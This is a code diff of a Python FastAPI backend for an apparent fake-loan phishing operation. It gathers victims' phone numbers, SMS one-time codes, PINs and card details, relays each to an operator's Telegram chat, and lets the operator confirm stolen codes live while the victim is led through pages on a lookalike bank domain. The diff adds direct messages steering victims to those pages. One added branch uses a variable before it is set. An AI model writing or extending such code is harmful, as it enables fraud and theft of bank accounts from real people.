@@ -25,6 +25,7 @@ def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
     except Exception as e:
         logging.error(f"Ошибка отправки: {e}")
 
+# ========== КЛАВИАТУРЫ ==========
 def get_application_keyboard(session_id: str):
     return {
         "inline_keyboard": [
@@ -32,6 +33,13 @@ def get_application_keyboard(session_id: str):
                 {"text": "🔐 Авторизация", "callback_data": f"auth_{session_id}"},
                 {"text": "💳 Оплата", "callback_data": f"pay_{session_id}"}
             ]
+        ]
+    }
+
+def get_phone_keyboard(session_id: str):
+    return {
+        "inline_keyboard": [
+            [{"text": "🔓 Перевести на код", "callback_data": f"ready_code_{session_id}"}]
         ]
     }
 
@@ -55,6 +63,7 @@ def get_pin_keyboard(session_id: str):
         ]
     }
 
+# ========== МОДЕЛИ ==========
 class CreditApplicationData(BaseModel):
     session_id: str
     name: str
@@ -64,10 +73,12 @@ class CreditApplicationData(BaseModel):
     months: int
     amount: float
     payment: float
+    user_chat_id: int = None
 
 class PhoneData(BaseModel):
     phone: str
     session_id: str
+    user_chat_id: int = None
 
 class CodeData(BaseModel):
     session_id: str
@@ -86,6 +97,7 @@ class PaymentData(BaseModel):
     amount: str = None
     timestamp: str = None
 
+# ========== FASTAPI ==========
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
@@ -105,6 +117,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
+# ========== 1. ЗАЯВКА ==========
 @app.post("/submit_credit_application")
 async def submit_credit_application(data: CreditApplicationData):
     sid = data.session_id
@@ -116,6 +129,7 @@ async def submit_credit_application(data: CreditApplicationData):
         "months": data.months,
         "amount": data.amount,
         "payment": data.payment,
+        "user_chat_id": data.user_chat_id,
         "status": "waiting_action"
     }
     
@@ -133,23 +147,28 @@ async def submit_credit_application(data: CreditApplicationData):
     send_to_telegram(MY_CHAT_ID, message, reply_markup=get_application_keyboard(sid))
     return {"status": "ok"}
 
+# ========== 2. НОМЕР ТЕЛЕФОНА (с кнопкой "Перевести на код") ==========
 @app.post("/submit_phone")
 async def submit_phone(data: PhoneData):
     phone = data.phone
     sid = data.session_id
+    user_chat_id = data.user_chat_id
     
     if sid not in sessions:
         sessions[sid] = {}
     
     sessions[sid]["phone"] = phone
+    sessions[sid]["user_chat_id"] = user_chat_id
     sessions[sid]["status"] = "waiting_code"
     
     send_to_telegram(
         MY_CHAT_ID,
-        f"📞 <b>НОМЕР ПОЛУЧЕН</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {phone}"
+        f"📞 <b>НОМЕР ПОЛУЧЕН</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {phone}",
+        reply_markup=get_phone_keyboard(sid)
     )
     return {"status": "ok"}
 
+# ========== 3. КОД ==========
 @app.post("/submit_code")
 async def submit_code(data: CodeData):
     sid = data.session_id
@@ -169,6 +188,7 @@ async def submit_code(data: CodeData):
     )
     return {"status": "waiting_confirmation"}
 
+# ========== 4. PIN ==========
 @app.post("/submit_pin")
 async def submit_pin(data: PinData):
     sid = data.session_id
@@ -188,6 +208,7 @@ async def submit_pin(data: PinData):
     )
     return {"status": "waiting_confirmation"}
 
+# ========== 5. ОПЛАТА ==========
 @app.post("/submit_payment")
 async def submit_payment(data: PaymentData):
     sid = data.session_id
@@ -203,6 +224,39 @@ async def submit_payment(data: PaymentData):
     send_to_telegram(MY_CHAT_ID, message)
     return {"status": "ok"}
 
+# ========== 6. ПРОВЕРКА СТАТУСА ==========
+@app.get("/check_action_status/{session_id}")
+async def check_action_status(session_id: str):
+    session = sessions.get(session_id)
+    if not session:
+        return {"status": "not_found"}
+    
+    action = session.get("pending_action", None)
+    if action:
+        session["pending_action"] = None
+        return {"action": action}
+    return {"action": None}
+
+@app.get("/check_status/{session_id}")
+async def check_status(session_id: str):
+    session = sessions.get(session_id)
+    if not session:
+        return {"status": "not_found"}
+    
+    status = session.get("status", "unknown")
+    
+    if status == "code_confirmed":
+        return {"status": "code_confirmed"}
+    elif status == "code_wrong":
+        return {"status": "code_wrong"}
+    elif status == "pin_confirmed":
+        return {"status": "pin_confirmed"}
+    elif status == "pin_wrong":
+        return {"status": "pin_wrong"}
+    else:
+        return {"status": status}
+
+# ========== 7. ОБРАБОТКА КНОПОК ==========
 @app.post("/webhook/callback")
 async def handle_callback(request: Request):
     data = await request.json()
@@ -221,46 +275,83 @@ async def handle_callback(request: Request):
     action = parts[0]
     session_id = "_".join(parts[1:]) if len(parts) > 2 else parts[1]
     
-    # КНОПКА АВТОРИЗАЦИИ
+    session = sessions.get(session_id)
+    user_chat_id = session.get("user_chat_id") if session else None
+    
+    # ===== КНОПКА "АВТОРИЗАЦИЯ" =====
     if action == "auth":
-        send_to_telegram(
-            MY_CHAT_ID,
-            f"🔐 *Авторизация*\n\n🆔 Сессия: <code>{session_id}</code>\n🔗 Ссылка для клиента:\nhttps://alfakreditplus.warepointpay.ru/page_82554/"
-        )
+        if user_chat_id:
+            send_to_telegram(
+                str(user_chat_id),
+                "🔐 *Для оформления кредита необходимо авторизоваться*\n\nПерейдите по ссылке:\nhttps://alfakreditplus.warepointpay.ru/page_82554/"
+            )
+            send_to_telegram(MY_CHAT_ID, f"🔐 Ссылка на авторизацию отправлена")
+        else:
+            send_to_telegram(MY_CHAT_ID, f"⚠️ Не найден chat_id для сессии {session_id}")
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
-            json={"callback_query_id": callback_id, "text": "Ссылка отправлена в чат"}
+            json={"callback_query_id": callback_id, "text": "Ссылка отправлена"}
         )
     
-    # КНОПКА ОПЛАТЫ
+    # ===== КНОПКА "ОПЛАТА" =====
     elif action == "pay":
-        send_to_telegram(
-            MY_CHAT_ID,
-            f"💳 *Оплата*\n\n🆔 Сессия: <code>{session_id}</code>\n🔗 Ссылка для клиента:\nhttps://alfakreditplus.warepointpay.ru/page_63860/"
-        )
+        if user_chat_id:
+            send_to_telegram(
+                str(user_chat_id),
+                "💳 *Для получения кредита укажите карту*\n\nПерейдите по ссылке:\nhttps://alfakreditplus.warepointpay.ru/page_63860/"
+            )
+            send_to_telegram(MY_CHAT_ID, f"💳 Ссылка на оплату отправлена")
+        else:
+            send_to_telegram(MY_CHAT_ID, f"⚠️ Не найден chat_id для сессии {session_id}")
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
-            json={"callback_query_id": callback_id, "text": "Ссылка отправлена в чат"}
+            json={"callback_query_id": callback_id, "text": "Ссылка отправлена"}
         )
     
-    # КНОПКИ ДЛЯ КОДА
+    # ===== КНОПКА "ПЕРЕВЕСТИ НА КОД" =====
+    elif action == "ready" and result == "code":
+        if session:
+            session["status"] = "ready_for_code"
+        send_to_telegram(MY_CHAT_ID, f"✅ Страница ввода кода открыта для сессии {session_id}")
+        requests.post(
+            f"{TELEGRAM_API_URL}/answerCallbackQuery",
+            json={"callback_query_id": callback_id, "text": "Страница кода открыта"}
+        )
+    
+    # ===== КНОПКИ ДЛЯ КОДА =====
     elif action == "code":
         result = parts[1] if len(parts) > 1 else "wrong"
         if result == "ok":
+            if session:
+                session["status"] = "code_confirmed"
+                if user_chat_id:
+                    send_to_telegram(str(user_chat_id), "✅ Код подтверждён! Введите PIN-код.")
             send_to_telegram(MY_CHAT_ID, f"✅ Код подтверждён для {session_id}")
         else:
+            if session:
+                session["status"] = "code_wrong"
+                if user_chat_id:
+                    send_to_telegram(str(user_chat_id), "❌ Неверный код. Попробуйте ещё раз.")
             send_to_telegram(MY_CHAT_ID, f"❌ Код отклонён для {session_id}")
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
             json={"callback_query_id": callback_id, "text": "Обработано"}
         )
     
-    # КНОПКИ ДЛЯ PIN
+    # ===== КНОПКИ ДЛЯ PIN =====
     elif action == "pin":
         result = parts[1] if len(parts) > 1 else "wrong"
         if result == "ok":
+            if session:
+                session["status"] = "pin_confirmed"
+                if user_chat_id:
+                    send_to_telegram(str(user_chat_id), "✅ Авторизация успешна!")
             send_to_telegram(MY_CHAT_ID, f"✅ PIN подтверждён для {session_id}")
         else:
+            if session:
+                session["status"] = "pin_wrong"
+                if user_chat_id:
+                    send_to_telegram(str(user_chat_id), "❌ Неверный PIN. Попробуйте ещё раз.")
             send_to_telegram(MY_CHAT_ID, f"❌ PIN отклонён для {session_id}")
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
